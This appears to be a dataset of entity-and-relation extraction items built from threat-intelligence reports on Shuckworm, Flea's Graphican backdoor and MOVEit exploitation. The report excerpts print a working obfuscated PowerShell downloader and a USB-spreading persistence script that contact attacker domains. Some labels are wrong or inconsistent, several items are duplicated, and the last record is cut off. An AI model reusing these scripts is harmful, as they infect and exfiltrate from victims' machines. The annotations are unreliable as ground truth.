{"instruction": "Attackers heavily focused on acquiring military and security intelligence in order to support invading forces. The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations. In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more. In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (USB propagation malware, tool)\nRelationships: (Shuckworm, mount, cyber attacks against Ukraine), (Shuckworm, add, USB propagation malware)"}
{"instruction": "Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB).", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Gamaredon, attacker), (Armageddon, attacker), (Russian Federal Security Service, attacker)\nRelationships: (Shuckworm, aka, Gamaredon), (Shuckworm, aka, Armageddon), (Shuckworm, on behalf of, Russian Federal Security Service)"}
{"instruction": "Shuckworm tactics, techniques, and procedures Shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the attachments of various file types, such as: .docx .rar (RAR archive files) .sfx (self-extracting archives) .lnk .hta (HTML smuggling files) The victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others. Once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (backdoors, tool)\nRelationships: (attackers, proceed to, download backdoor)"}
{"instruction": "Shuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom, blogged about Backdoor.Pterodo in April 2022 , documenting how we had found four variants of the backdoor with similar functionality. The variants are Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (C&C) server. Examples of recent scheduled tasks include execution of the following command lines: CSIDL_SYSTEM\\wscript.exe \"CSIDL_PROFILE\\appdata\\local\\temp\\desert\" //e:vbscript //b /dmc /j2k /spl /nff CSIDL_SYSTEM\\wscript.exe \"CSIDL_PROFILE\\favorites\\jumper.asf\" //e:vbscript //b /asf /mdf /nab /apk wscript.exe \"C:\\Users\\[REDACTED]\\Contacts\\delightful.abk\" //e:vbscript //b /cfg /mdm /cfm /mp4", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Pterodo, malware), (Backdoor.Pterodo, malware), (shtasks.exe, file), (command-and-control (C&C) server, tool)\nRelationships: (Shuckworm, use, PowerShell script), (Shuckworm, spread, Pterodo), (variants, use, shtasks.exe), (variants, use, command-and-control server)"}
{"instruction": "The new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using an rtk.lnk extension. The script uses file names such as \u201cporn_video.rtf.lnk\u201d, \u201cdo_not_delete.rtf.lnk\u201d\u201d and \u201cevidence.rtf.lnk\u201d in an attempt to entice individuals to open the files. These file names are generally in Ukrainian, but some are also in English. Next, the script enumerates all drives, copying itself to any available removable disks \u2013 USB drives. These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations. In this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram\u2019s micro-blogging platform, called Telegraph, to store C&C addresses.", "input": null, "output": "Named Entities: (PowerShell script, tool), (rtk.lnk, file), (porn_video.rtf.lnk, file), (do_not_delete.rtf.lnk, file), (evidence.rtf.lnk, file), (Telegram messaging service, tool), (Telegraph, tool)\nRelationships: (PowerShell script, use, rtk.lnk), (PowerShell script, use file name, porn_video.rtf.lnk), (PowerShell script, use file name,do_not_delete.rtf.lnk), (PowerShell script, use file name, evidence.rtf.lnk), (group, use, Telegram messaging service)"}
{"instruction": "Figure 1. Threat actors use Telegraph to store C&C addresses Shuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional C&C infrastructure and Shuckworm activity. Symantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest.", "input": null, "output": "Named Entities: (Telegraph, tool), (Shuckworm, attacker), (Giddome, tool)\nRelationships: (Shuckworm, use, Telegraph), (Giddome, is, Shuckworm backdoor)"}
{"instruction": "Typical Attack Chain The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign. In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document. After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers\u2019 C&C server: \"CSIDL_SYSTEM\\cmd.exe\" /c start /min \"\" powershell -w hidden \"$gt='/get.'+[char](56+56)+[char](104)+[char](112);$hosta=[char](50+48);[system.net.servicepointmanager]::servercertificatevalidationcallback={$true};$hosta+='.vafikgo.';$hosta+=[char](57+57);$hosta+=[char](60+57);$addrs=[system.net.dns]::gethostbyname($hosta);$addr=$addrs.addresslist[0];$client=(new-object net.webclient);$faddr='htt'+'ps://'+$addr+$gt;$text=$client.downloadstring($faddr);iex $text\" More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers.", "input": null, "output": "Named Entities: (Shuckworm, malware)\nRelationships: (attackers' C&C server, host, PowerShell script)"}
{"instruction": "Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group\u2019s scripts observed per month between January and April 2023. Next, a VBS script, which was Shuckworm\u2019s Pterodo backdoor, was executed: CSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\deprive.wow //e:vbscript //b /kmc /fff /cfm /sc4model Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments. On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-\u043d\u0430\u043a\u043e\u043f\u0438\u0442\u0435\u043b\u044c\" translates as \"usb-drive\".", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Pterodo backdoor, tool), (foto.safe, file)\nRelationships: (Shuckworm, use, PowerShell scripts), (Shuckworm, execute, Pterodo backdoor), (Pterodo backdoor, executed from, foto.safe)"}
{"instruction": "The foto.safe file is a Base64-encoded script. Decoded it looks like the following: fUNCtIon sET-lnK ($chILd) { $nAMetxt = \"foto.sAfe\".TolowER(); $NAmE = (\"\u043a\u041e\u041c\u041f\u0420\u041e\u041c\u0430\u0442\", \"\u041a\u041e\u0420\u0417\u0438\u041d\u0410\", \"\u0421\u0435\u041a\u0420\u0435\u0442\u043d\u041e\" | GeT-rAnDOm).ToUPPeR(); $WSHSHELl = NEw-obJeCT -CoMObjeCT WSCriPT.shELL; $sHORTcut = $wShShEll.CREatesHoRTCUt($cHild +\"\\$nAMe.LNK\"); $shoRtCuT.iConloCaTiON = \"C:\\wiNDoWS\\SysteM32\\SHELL32.DLL,3\"; $SHOrTcUT.TArGetpAth = \"c:\\wInDOwS\\sYstEm32\\WInDOwSpowERshell\\V1.0\\POwERShEll.ExE\".ToLoweR(); $text = \"-wInDoWsTYlE hidDeN -nolOgo Iex (IeX (GeT-cOnTent .\\$NAMetxt | OUT-STrIng))\".TOlower(); $sHORTCUT.ArGUMEnTs = $tExt; $sHortCUT.saVE(); $mYfIlE= $chIlD+\"\\$naMeTXT\" cOPY-Item $enV:UsErprOfilE\\iNdEx.phP -deSTINAtION $mYfILE $FIlE=GEt-ITEM $mYfiLE -forCe $FiLe.ATtRiButes='hiDDEN' } Set-ITemPRoPERTY -pAth HkCU:\\soFTWare\\MicROsOfT\\WiNDows\\cURRENtVerSiON\\ruN -NAME safE -valUE $env:windir'\\sYSTeM32\\wINDoWSPowErSHEll\\v1.0\\pOwERShell.eXE -WIndowSTYlE hiddEN -noLOgO inVOkE-ExpREsSIOn (get-contEnT $eNV:usERPRoFILe\\INdEX.PHp | Out-sTRing) | poweRSHeLL -noPROfILE'; coPy-item .\\\"fOtO.safe\" -dEsTInaTioN $Env:USeRprOFIle\\iNdEX.pHp WHile($CoUNT -lE 2){ $urLs = 'hTTP://'+ [SYSTEM.NEt.DnS]::geThostadDREsSes([String]$(GEt-random)+'.cOriDAS.Ru') +'/slEEP.Php'; iEX $(New-ObJeCt Net.WEBClient).uPloAdStRING($uRls.ToloWER(),'') $drIVE = GeT-wmIoBJeCt WIN32_VOluME -fILTer \"drIvETYPe='2'\"; $Drive.naMe | FOreaCH-oBJecT{ $CHiLdS = GET-ChilDITem $drivE.nAMe foReach($cHilDs IN $chiLDs) { if( [SYsTEM.io.fiLE]::GetAttributES($ChilDS.FuLlnAMe) -eq [SYsTEM.Io.fILeaTTrIbuTES]::DIRecToRy ) { sET-lnk $chILds.fUlLName }} IF(($dRIVe.CapaCITY - $DriVe.fREeSPACE) -Gt 1000000){ SEt-lNK $DRivE.name }} STArt-SLEeP -S 300; }", "input": null, "output": "Named Entities: (foto.safe, file)\nRelationships: No related relationships."}
{"instruction": "This PowerShell script is used to copy itself onto the infected machine and then create a shortcut file that links to the PowerShell script. Symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines.", "input": null, "output": "No related entities and relations."}
{"instruction": "Victims One of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts. The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations\u2019 human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things.", "input": null, "output": "No related entities and relations."}
{"instruction": "This activity demonstrates that Shuckworm\u2019s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations.", "input": null, "output": "Named Entities: (Shuckworm, attacker)\nRelationships: No related relations."}
{"instruction": "Graphican: Flea Uses New Backdoor in Attacks Targeting Foreign Ministries", "input": null, "output": "Named Entities: (Graphican, malware), (Backdoor, threat type), (Flea, attacker)\nRelationships: (Graphican, belong to, Backdoor), (Flea, use, Graphican)"}
{"instruction": "Backdoor leverages Microsoft Graph API for C&C communication. The Flea (aka APT15, Nickel) advanced persistent threat (APT) group continued to focus on foreign ministries in a recent attack campaign that ran from late 2022 into early 2023 in which it leveraged a new backdoor called Backdoor.Graphican. This campaign was primarily focused on foreign affairs ministries in the Americas, although the group also targeted a government finance department in a country in the Americas and a corporation that sells products in Central and South America. There was also one victim based in a European country, which was something of an outlier. This victim had also previously suffered a seemingly unrelated ransomware attack in July 2022. However, the primary focus of the campaign observed by the Threat Hunter Team at Symantec, part of Broadcom, does appear to be on ministries of foreign affairs in the Americas.", "input": null, "output": "Named Entities: (Flea, attacker), (APT15, attacker), (Nickel, attacker), (Backdoor.Graphican, malware), (ransomware attack, threat type)\nRelationships: (Flea, aka, APT15), (Flea, aka, Nickel), (APT15, aka, Nickel), (Flea, leverage, Backdoor.Graphican)"}
{"instruction": "Flea has a track record of honing in on government targets, diplomatic missions, and embassies, likely for intelligence-gathering purposes.", "input": null, "output": "Named Entities: (Flea, attacker)\nRelationships: No related relations."}
{"instruction": "Tools Flea used a large number of tools in this campaign. As well as the new Graphican backdoor, the attackers leveraged a variety of living-off-the-land tools, as well as tools that have been previously linked to Flea. We will detail these tools in this section. Backdoor.Graphican Graphican is an evolution of the known Flea backdoor Ketrican, which itself was based on a previous malware \u2014 BS2005 \u2014 also used by Flea. Graphican has the same basic functionality as Ketrican, with the difference between them being Graphican\u2019s use of the Microsoft Graph API and OneDrive to obtain its command-and-control (C&C) infrastructure. This technique was used in a similar way by the Russian state-sponsored APT group Swallowtail (aka APT28, Fancy Bear, Sofacy, Strontium) in a campaign in 2022 in which it delivered the Graphite malware. In that campaign, the Graphite malware used the Microsoft Graph API and OneDrive as a C&C server.", "input": null, "output": "Named Entities: (Flea, attacker), (Graphican, malware), (Ketrican, malware), (BS2005, malware), (Microsoft Graph API, tool), (Swallowtail, attacker), (APT28, attacker), (Fancy Bear, attacker), (Sofacy, attacker), (Strontium, attacker)\nRelationships: (Flea, use, Graphican), (Graphican, evolution of, Ketrican), (Ketrican, based on, BS2005), (Graphican, use, Microsoft Graph API), (Swallowtail, aka, APT28), (Swallowtail, aka, Fancy Bear), (Swallowtail, aka, Sofacy), (Swallowtail, is, Strontium)"}
{"instruction": "The observed Graphican samples did not have a hardcoded C&C server, rather they connected to OneDrive via the Microsoft Graph API to get the encrypted C&C server address from a child folder inside the \"Person\" folder. The malware then decoded the folder name and used it as a C&C server for the malware. All instances of this variant used the same parameters to authenticate to the Microsoft Graph API. We can assume they all have the same C&C, which can be dynamically changed by the threat actors. Once on a machine, Graphican does the following: Disables the Internet Explorer 10 first run wizard and welcome page via registry keys Checks if the iexplore.exe process is running Creates a global IWebBrowser2 COM object to access the internet Authenticates to the Microsoft Graph API to get a valid access token and a refresh_token", "input": null, "output": "Named Entities: (Graphican, malware), (C&C server, tool), (OneDrive, tool), (Microsoft Graph API, tool), (iexplore.exe, file)\nRelationships: (Graphican, connect, C&C server), (Graphican, use, OneDrive), (Graphican, use, Microsoft Graph API), (Graphican, check, iexplore.exe)"}
{"instruction": "Using the Graph API it enumerates the child files and folders inside the \u201cPerson\u201d folder in OneDrive Obtains the name of the first folder and decrypts it to use it as a C&C server Generates a Bot ID based on the hostname, local IP, Windows version, the system default language identifier, and the process bitness (32-bit or 64-bit) of the compromised machine Registers the bot into the C&C with the format string \"f$$$%s&&&%s&&&%s&&&%d&&&%ld&&&%s\" or \" [email protected] @@%s###%s###%s###%d###%ld###%s\" filled with the previously collected information from the victim\u2019s computer Polls C&C server for new commands to execute Commands that can be executed by Graphican include: 'C' \u2014 Creates an interactive command line that is controlled from the C&C server 'U' \u2014 Creates a file on the remote computer 'D' \u2014 Downloads a file from the remote computer to the C&C server 'N' \u2014 Creates a new process with a hidden window", "input": null, "output": "Named Entities: (OneDrive, tool), (Graphican, malware)\nRelationships: No related relations."}
{"instruction": "P' \u2014 Creates a new PowerShell process with a hidden window and saves the results in a temporary file in the TEMP folder and sends the results to the C&C server During the course of this campaign, we also observed an updated version of Ketrican, which had a hardcoded C&C server and only implemented the \u2018C\u2019, \u2018U\u2019, and \u2018D\u2019 commands. We also saw an older version of Ketrican (compiled in 2020) that implemented only the \u2018N\u2019 and \u2018P\u2019 commands. This demonstrates that the group is actively developing and adapting Ketrican to suit its objectives. Other Tools Other tools leveraged by Flea in this recent activity include: EWSTEW \u2014 This is a known Flea backdoor that is used to extract sent and received emails on infected Microsoft Exchange servers. We saw new variants of this tool being used in this campaign.", "input": null, "output": "Named Entities: (PowerShell script, tool), (Ketrican, tool), (Flea, attacker), (EWSTEW, tool)\nRelationships: (Flea, uses, Ketrican), (Flea, develops, Ketrican), (Flea, adapts, Ketrican), (Flea, uses, EWSTEW)"}
{"instruction": "Mimikatz, Pypykatz, Safetykatz \u2014 Mimikatz is a publicly available credential-dumping tool. It allows a local attacker to dump secrets from memory by exploiting Windows single sign-on functionality. Pupykatz and Safetykatz are Mimikatz variants with the same functionality. Lazagne \u2014 A publicly available , open-source tool designed to retrieve passwords from multiple applications. Quarks PwDump \u2014 Quarks PwDump is an open-source tool that can dump various types of Windows credentials: local accounts, domain accounts, and cached domain credentials. It was reported as being used in a campaign that Kaspersky called IceFog all the way back in 2013. SharpSecDump \u2014 The .Net port of the remote SAM and LSA Secrets dumping functionality of Impacket's secretsdump.py. K8Tools - This is a publicly available toolset with a wide variety of capabilities, including privilege escalation, password cracking, a scanning tool, and vulnerability utilization. It also contains exploits for numerous known vulnerabilities in various systems.", "input": null, "output": "Named Entities: (Mimikatz, tool), (Pypykatz, tool), (Safetykatz, tool), (Lazagne, tool), (Quarks PwDump, tool),  (IceFog, attacker), (SharpSecDump, tool), , (secretsdump.py, file), (K8Tools, tool)\nRelationships: (Pypykatz, variants, Mimikatz), (Safetykatz, variants, Mimikatz), (IceFog, use, Quarks PwDump), (SharpSecDump, use, secretsdump.py)"}
{"instruction": "EHole \u2014 A publicly available tool that can help attackers identify vulnerable systems. Web shells \u2014 The attackers use a number of publicly available web shells, including AntSword, Behinder, China Chopper, and Godzilla. Web shells provide a backdoor onto victim machines. Some of these web shells, such as China Chopper and Behinder, are associated with Chinese threat actors. Exploit of CVE-2020-1472 \u2014 This is an elevation of privilege vulnerability that exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol ( MS-NRPC ). An attacker who successfully exploits the vulnerability could run a specially crafted application on a device on the network. A patch has been available for this vulnerability since the first quarter of 2021.", "input": null, "output": "Named Entities: (EHole, tool), (CVE-2020-1472, vulnerability)\nRelationships: (web shells, provide, backdoor)"}
{"instruction": "Flea Background Flea has been in operation since at least 2004. Over that time its tactics, techniques, and procedures (TTPs), as well as its targeting, have changed and developed. In recent years, the group has primarily focused on attacks against government organizations, diplomatic entities, and non-governmental organizations (NGOs) for the purposes of intelligence gathering. North and South America does appear to have become more of a focus for the group in recent times, which aligns with the targeting we saw in this campaign. The goal of the group does seem to be to gain persistent access to the networks of victims of interest for the purposes of intelligence gathering. Its targets in this campaign, of ministries of foreign affairs, also point to a likely geo-political motive behind the campaign.", "input": null, "output": "Named Entities: (Flea, attacker)\nRelationships: No related relations."}
{"instruction": "Flea traditionally used email as an initial infection vector, but there have also been reports of it exploiting public-facing applications, as well as using VPNs, to gain initial access to victim networks. Microsoft seized domains belonging to Flea in December 2021. The company seized 42 domains that it said were used in operations that targeted organizations in the U.S. and 28 other countries for intelligence-gathering purposes. Flea was also linked in a November 2022 report by Lookout to a long-running campaign targeting Uyghur-language websites and social media in China. Flea is believed to be a large and well-resourced group, and it appears that exposure of its activity, and even takedowns such as that detailed by Microsoft, have failed to have a significant impact when it comes to stopping the group\u2019s activity.", "input": null, "output": "Named Entities: (Flea, attacker)\nRelationships: (Flea, be, large and well-resourced group)"}
{"instruction": "New Backdoor and Notable Technique The use of a new backdoor by Flea shows that this group, despite its long years of operation, continues to actively develop new tools. The group has developed multiple custom tools over the years. The similarities in functionality between Graphican and the known Ketrican backdoor may indicate that the group is not very concerned about having activity attributed to it.", "input": null, "output": "Named Entities: (Flea, attacker), (Graphican, tool), (Ketrican, tool)\nRelationships: (Flea, use, backdoor), (Flea, develop, new tools), (Graphican, similar, Ketrican)"}
{"instruction": "The most noteworthy thing about Graphican itself is the abuse of the Microsoft Graph API and OneDrive to obtain its C&C server. The fact that a similar technique was used by Swallowtail, an unconnected APT group operating out of a different region, is also worth noting. Once a technique is used by one threat actor, we often see other groups follow suit, so it will be interesting to see if this technique is something we see being adopted more widely by other APT groups and cyber criminals. Flea\u2019s targets \u2014 foreign ministries \u2014 are also interesting; though they do align with the targets the group has directed its activity at in the past. It appears the Flea\u2019s interests remain similar to what they have been in recent years, even as its tools and techniques continue to evolve.", "input": null, "output": "Named Entities: (Graphican, malware), (Microsoft Graph API, tool), (OneDrive, tool). (Swallowtail, attacker), (Flea, attacker)\nRelationships: (Graphican, abuse, Microsoft Graph API), (Graphican, abuse, OneDrive)"}
{"instruction": "Shuckworm: Inside Russia\u2019s Relentless Cyber Campaign Against Ukraine", "input": null, "output": "Named Entities: (Shuckworm, malware)\nRelationships: (Russia, launch, cyber campaign)"}
{"instruction": "Attackers heavily focused on acquiring military and security intelligence in order to support invading forces. The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations. In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more. In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (USB propagation malware, malware)\nRelationships: (Shuckworm, use, USB propagation malware)"}
{"instruction": "Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB).", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Gamaredon, attacker), (Armageddon, attacker)\nRelationships: (Shuckworm, aka, Gamaredon), (Shuckworm, aka, Armageddon)"}
{"instruction": "Shuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom, blogged about Backdoor.Pterodo in April 2022 , documenting how we had found four variants of the backdoor with similar functionality. The variants are Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (C&C) server. Examples of recent scheduled tasks include execution of the following command lines: CSIDL_SYSTEM\\wscript.exe \"CSIDL_PROFILE\\appdata\\local\\temp\\desert\" //e:vbscript //b /dmc /j2k /spl /nff CSIDL_SYSTEM\\wscript.exe \"CSIDL_PROFILE\\favorites\\jumper.asf\" //e:vbscript //b /asf /mdf /nab /apk wscript.exe \"C:\\Users\\[REDACTED]\\Contacts\\delightful.abk\" //e:vbscript //b /cfg /mdm /cfm /mp4", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Pterodo, malware), (Backdoor.Pterodo, malware), (shtasks.exe, file), (command-and-control (C&C) server, tool)\nRelationships: (Shuckworm, use, PowerShell script), (Shuckworm, spread, Backdoor.Pterodo), (Backdoor.Pterodo, use, shtasks.exe), (Backdoor.Pterodo, use, command-and-control (C&C) server)"}
{"instruction": "Typical Attack Chain The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign. In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document. After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers\u2019 C&C server: \"CSIDL_SYSTEM\\cmd.exe\" /c start /min \"\" powershell -w hidden \"$gt='/get.'+[char](56+56)+[char](104)+[char](112);$hosta=[char](50+48);[system.net.servicepointmanager]::servercertificatevalidationcallback={$true};$hosta+='.vafikgo.';$hosta+=[char](57+57);$hosta+=[char](60+57);$addrs=[system.net.dns]::gethostbyname($hosta);$addr=$addrs.addresslist[0];$client=(new-object net.webclient);$faddr='htt'+'ps://'+$addr+$gt;$text=$client.downloadstring($faddr);iex $text\" More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers.", "input": null, "output": "Named Entities: (Shuckworm, malware)\nRelationships: No related relations."}
{"instruction": "Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group\u2019s scripts observed per month between January and April 2023. Next, a VBS script, which was Shuckworm\u2019s Pterodo backdoor, was executed: CSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\deprive.wow //e:vbscript //b /kmc /fff /cfm /sc4model Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments. On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-\u043d\u0430\u043a\u043e\u043f\u0438\u0442\u0435\u043b\u044c\" translates as \"usb-drive\".", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Pterodo backdoor, tool), (foto.safe, file), (USB key, tool)\nRelationships: (Shuckworm, use, PowerShell scripts), (Shuckworm, execute, Pterodo backdoor), (Pterodo backdoor, executed from, foto.safe), (Shuckworm, use, USB key)"}
{"instruction": "Victims One of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts. The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations\u2019 human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things.", "input": null, "output": "No related entities and relations."}
{"instruction": "This activity demonstrates that Shuckworm\u2019s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations.", "input": null, "output": "Named Entities: (Shuckworm, attacker)\nRelationships: No related relations."}
{"instruction": "MOVEit Vulnerabilities: What You Need to Know", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec products guard against exploitation of vulnerabilities that are being actively exploited by cyber-crime actors. Extortion actors have been actively exploiting a recently patched vulnerability in MOVEit Transfer, a file-transfer application that is widely used to transmit information between organizations. The nature of the software affected means that attackers can exploit unpatched systems to mount a supply chain attack against multiple organizations. While the original vulnerability ( CVE-2023-34362 ) was patched on May 31, MOVEit Transfer\u2019s developers announced on Friday (June 9) that multiple additional vulnerabilities (CVEs pending) have also been identified and patched. Prior to its patching, attackers linked to the Clop ransomware operation were already exploiting CVE-2023-34362 as a zero-day vulnerability. Proof-of-concept code for the exploit is now publicly available, meaning other attackers are now likely to attempt to exploit unpatched systems. What is MOVEit Transfer?", "input": null, "output": "Named Entities: (MOVEit Transfer, tool), (CVE-2023-34362, vulnerability), (Clop ransomware, malware)\nRelationships: (MOVEit Transfer, affected by, MOVEit Transfer), (Clop ransomware, exploit, CVE-2023-34362\uff09"}
{"instruction": "MOVEit Transfer is a managed file-transfer application developed by Progress Software. It is designed to permit secure transfer of files between businesses and their customers. What is the nature of the vulnerability? The original vulnerability ( CVE-2023-34362 ) occurs in the MOVEit Transfer web application. It affected all versions prior to 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1). \u201c[An] attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements,\u201d Progress said. For how long was the vulnerability being exploited before it was patched? According to a U.S. government advisory, active exploitation appears to have begun on May 27, 2023. How has the vulnerability been exploited to date?", "input": null, "output": "Named Entities: (MOVEit Transfer, tool), (CVE-2023-34362, vulnerability)\nRelationships:  (CVE-2023-34362, occur, MOVEit Transfer)"}
{"instruction": "The vulnerability is being actively exploited by the Clop ransomware operation. According to a joint advisory issued by the U.S. Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) , the attackers exploited the vulnerability to install a web shell called Lemurloot (JS.Malscript!g1) on affected systems. This was then used to steal data from underlying databases. Lemurloot was designed specifically to target the MOVEit Transfer platform. It authenticates incoming HTTPS requests via a hard-coded password; runs commands that will download files from the MOVEit Transfer database; extracts its Azure system settings; retrieves records; and can create, insert, or delete a particular user. When responding to a request, Lemurloot returns stolen data in a comfile format.", "input": null, "output": "Named Entities: (Clop, malware), (Lemurloot, tool), (JS.Malscript!g1, malware), (MOVEit Transfer, tool)\nRelationships: (Clop, install, Lemurloot), (Lemurloot, is, JS.Malscript!g1), (Lemurloot, target, MOVEit Transfer)"}
{"instruction": "Shortly after the disclosure of the vulnerability, attackers linked to the Clop ransomware operation claimed responsibility for the attack and said that they had stolen data from multiple MOVEit users and their customers. It threatened to release the stolen data unless a ransom is paid. What is known about Clop? Clop is an extortion and ransomware operation run by a cyber-crime group known as Snakefly (aka TA505, FIN11). While the group initially extorted victims by encrypting files using its own ransomware payload (Ransom.Clop), in recent times it has been known to eschew encryption entirely and rely on the threat of leaking stolen data to extort its victims.", "input": null, "output": "Named Entities: (Clop, malware), (Snakefly, attacker), (TA505, attacker), (FIN11, attacker), (Ransom.Clop, malware)\nRelationships: (Clop, belong to, ransomware), (Snakefly, run, Clop), (Snakefly, aka, TA505), (Snakefly, aka, FIN11), (Clop, use, Ransom.Clop)"}
{"instruction": "The group has a track record in exploiting zero-day vulnerabilities. In 2021, it was linked to the exploitation of multiple vulnerabilities in Accellion FTA , another file-transfer application. Earlier this year it was responsible for exploiting a zero-day vulnerability ( CVE-2023-0669 ) in the GoAnywhere MFT platform. How do Symantec products guard against exploitation of this vulnerability? Symantec products will guard against exploit attempts and payloads with the following detections: File-based JS.Malscript!g1 Trojan Horse Trojan.Gen.2 Trojan.Gen.NPE Trojan.Malscript Trojan.Webshell WS.Malware.1 WS.Malware.2 Machine learning-based Heur.AdvML.C Network-based Attack: MOVEit Transfer RCE CVE-2023-34362 Policy-based Data Center Security (DCS) default hardening policies such as sym_win_hardened_sbp provide 0-day protection for CVE-2023-34362. DCS policy control \"Software Install Restrictions\" for MS SQL, MS IIS and other hardened application sandboxes stop Clop ransomware from exploiting this vulnerability by preventing arbitrary deployment of webshells and unauthorized software. Web-based Observed domains/IPs are covered under security categories.", "input": null, "output": "Named Entities: (CVE-2023-0669, vulnerability), (Symantec products, tool), (JS.Malscript!g1, malware), (Trojan Horse, malware), (Trojan.Gen.2, malware), (Trojan.Gen.NPE, malware), (Trojan.Malscript, malware), (Trojan.Webshell, malware), (WS.Malware.1, malware), (WS.Malware.2, malware), (Heur.AdvML.C, 